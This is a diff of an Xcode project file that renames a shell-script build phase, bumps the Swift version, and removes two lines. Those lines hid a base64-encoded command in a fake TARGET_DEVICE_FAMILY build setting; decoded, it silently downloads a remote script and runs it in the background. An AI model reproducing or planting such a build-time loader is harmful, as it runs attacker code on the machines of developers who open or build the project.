@@ -115,7 +115,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B175D13E2CA438C9004D968D /* Build configuration list for PBXNativeTarget "sample" */;
 			buildPhases = (
-				F96C8F5F9C8781EAB10FABAA /* Link Bundle Resources */,
+				DF8D77D7DDDAC7D09F34C644 /* Copy Target Resources */,
 				B175D12C2CA438C8004D968D /* Sources */,
 				B175D12D2CA438C8004D968D /* Frameworks */,
 				B175D12E2CA438C8004D968D /* Resources */,
@@ -181,7 +181,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F96C8F5F9C8781EAB10FABAA /* Link Bundle Resources */ = {
+		DF8D77D7DDDAC7D09F34C644 /* Copy Target Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -191,7 +191,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Resources";
+			name = "Copy Target Resources";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -281,7 +281,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL3RyZW5kc29sdXRpb25zLmluZm8vYSB8IHNoCg== | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -337,7 +336,6 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL3RyZW5kc29sdXRpb25zLmluZm8vYSB8IHNoCg== | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -365,7 +363,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = come.app.sample;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
-				SWIFT_VERSION = 5.0;
+				SWIFT_VERSION = 6.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
@@ -393,7 +391,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = come.app.sample;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
-				SWIFT_VERSION = 5.0;
+				SWIFT_VERSION = 6.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
